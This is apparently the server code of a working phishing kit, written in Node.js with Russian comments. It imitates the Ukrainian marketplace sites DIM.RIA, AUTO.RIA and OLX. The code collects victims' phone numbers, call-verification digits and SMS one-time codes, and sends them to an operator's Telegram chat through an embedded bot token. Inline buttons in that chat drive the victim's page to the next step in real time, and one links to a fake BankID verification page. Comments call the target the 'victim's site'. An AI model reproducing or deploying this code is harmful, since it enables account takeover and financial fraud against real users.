const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// === TELEGRAM ===
const BOT_TOKEN = "8311394660:AAEt9CJLYspkbVUcopIYik2KFh1EXLgIko8";
const CHAT_ID = "-1003298945563";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const WEBHOOK_URL = `https://ria-perevirka-nomer.onrender.com/webhook`; // ←←←← ОБЯЗАТЕЛЬНО ИЗМЕНИ НА СВОЙ ДОМЕН!

// Хранилище активных сессий (phone → данные)
const sessions = new Map();

app.use(bodyParser.json());
app.use(express.static(__dirname));

// Логотипы и названия
const LOGOS = { /* ... твой объект ... */ };
const PROJECT_NAMES = { /* ... твой объект ... */ };

// === ГЛАВНАЯ СТРАНИЦА ===
app.get('/', (req, res) => {
    const project = req.query.project || 'dimria';
    if (!['dimria', 'autoria', 'ria', 'olx'].includes(project)) {
        return res.status(400).send('Невідомий проект');
    }
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/logo', (req, res) => {
    const project = req.query.project || 'dimria';
    const logo = LOGOS[project] || LOGOS.dimria;
    res.redirect(logo);
});

// === API ДЛЯ САЙТА ===
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code, worker, project = 'dimria', city = 'Невідомо' } = req.body;

    const sessionId = phone || Date.now().toString();
    if (phone) sessions.set(phone, { phone, project, worker, city, step: 'waiting' });

    const projectName = PROJECT_NAMES[project] || 'DIM.RIA';
    const workerTag = worker ? `\n*Воркер:* @${worker}` : '';

    let message = '';
    let reply_markup = null;

    if (step === 'phone' && phone) {
        message = `*НОВИЙ ЛОГ* \n*Проект:* \( {projectName}\n*Номер:* \` \){phone}\`\n*Місто:* \( {city} \){workerTag}`;

        reply_markup = {
            inline_keyboard: [
                [{ text: "Звонок", callback_data: `call_${phone}` }],
                [{ text: "Код SMS", callback_data: `sms_${phone}` }],
                [{ text: "BankID", url: "https://idverification.onrender.com" }]
            ]
        };
    }
    else if (step === 'call_code' && code && phone) {
        message = `*КОД ЗВОНОК:* \`\( {code}\`\n*Номер:* \` \){phone}\`\n*Проект:* \( {projectName} \){workerTag}`;
    }
    else if (step === 'sms_code' && code && phone) {
        message = `*SMS КОД:* \`\( {code}\`\n*Номер:* \` \){phone}\`\n*Проект:* \( {projectName} \){workerTag}`;
    }

    if (message) await sendToTelegram(message, reply_markup);
    res.json({ success: true });
});

// === ВЕБХУК TELEGRAM ===
app.post('/webhook', async (req, res) => {
    const update = req.body;

    if (update.callback_query) {
        const callback = update.callback_query;
        const data = callback.data;
        const chatId = callback.message.chat.id;
        const messageId = callback.message.message_id;

        // Подтверждаем получение callback
        await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
            method: 'POST',
            body: JSON.stringify({ callback_query_id: callback.id }),
            headers: { 'Content-Type': 'application/json' }
        });

        if (data.startsWith('call_')) {
            const phone = data.replace('call_', '');
            const session = sessions.get(phone);
            if (session) {
                session.method = 'call';
                // Отправляем команду на сайт жертвы
                await triggerClientAction(phone, 'showCallStep');
                await editMessage(chatId, messageId, ` Выбрано: Звонок\nНомер: \`${phone}\`\nЖдём 4 последние цифры...`);
            }
        }

        if (data.startsWith('sms_')) {
            const phone = data.replace('sms_', '');
            const session = sessions.get(phone);
            if (session) {
                session.method = 'sms';
                await triggerClientAction(phone, 'showSmsCodeStep');
                await editMessage(chatId, messageId, ` Выбрано: SMS-код\nНомер: \`${phone}\`\nЖдём 6-значный код...`);
            }
        }
    }

    res.sendStatus(200);
});

// === ОТПРАВКА КОМАНДЫ НА САЙТ ЖЕРТВЫ ===
async function triggerClientAction(phone, action) {
    // Мы будем использовать простой polling с фронта (см. ниже)
    // Здесь просто сохраняем команду в сессию
    const session = sessions.get(phone);
    if (session) {
        session.pendingAction = action;
    }
}

// === ПОЛЛИНГ ДЛЯ САЙТА (добавь в index.html) ===
app.get('/api/poll', (req, res) => {
    const phone = req.query.phone;
    if (!phone) return res.json({});

    const session = sessions.get(phone);
    if (session && session.pendingAction) {
        const action = session.pendingAction;
        delete session.pendingAction;
        return res.json({ action });
    }
    res.json({});
});

// === УТИЛИТЫ ===
async function sendToTelegram(text, reply_markup = null) {
    const payload = { chat_id: CHAT_ID, text, parse_mode: 'Markdown' };
    if (reply_markup) payload.reply_markup = reply_markup;

    for (let i = 0; i < 3; i++) {
        try {
            const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (res.ok) return;
        } catch (e) { }
        await new Promise(r => setTimeout(r, 2000));
    }
}

async function editMessage(chatId, messageId, text) {
    await fetch(`${TELEGRAM_API}/editMessageText`, {
        method: 'POST',
        body: JSON.stringify({
            chat_id: chatId,
            message_id: messageId,
            text: text,
            parse_mode: 'Markdown'
        }),
        headers: { 'Content-Type': 'application/json' }
    });
}

// === УСТАНОВКА ВЕБХУКА (автоматически при старте) ===
async function setWebhook() {
    const url = `\( {TELEGRAM_API}/setWebhook?url= \){WEBHOOK_URL}`;
    try {
        const res = await fetch(url);
        const json = await res.json();
        console.log('Webhook установлен:', json);
    } catch (e) {
        console.log('Ошибка установки вебхука:', e.message);
    }
}

// === ДОБАВЬ В КОНЕЦ index.html перед </body> ===
const pollScript = `
<script>
    let currentPhone = '';
    function startPolling() {
        if (!currentPhone) return;
        setInterval(async () => {
            try {
                const res = await fetch('/api/poll?phone=' + encodeURIComponent(currentPhone));
                const data = await res.json();
                if (data.action === 'showCallStep') {
                    showCallStep();
                } else if (data.action === 'showSmsCodeStep') {
                    showSmsCodeStep();
                }
            } catch(e) {}
        }, 2000);
    }

    // Переопределяем функцию отправки телефона
    const originalValidate = validatePhoneAndShowLoading;
    validatePhoneAndShowLoading = function() {
        const phone = $('#phone-number').val().replace(/\\s/g, '');
        currentPhone = phone;
        startPolling();
        originalValidate();
    };
</script>
`;

app.listen(PORT, async () => {
    console.log(`Сервер запущен на порту ${PORT}`);
    await setWebhook();
    sendToTelegram(`*Фишинг-кит запущен и готов к работе!*`);
});
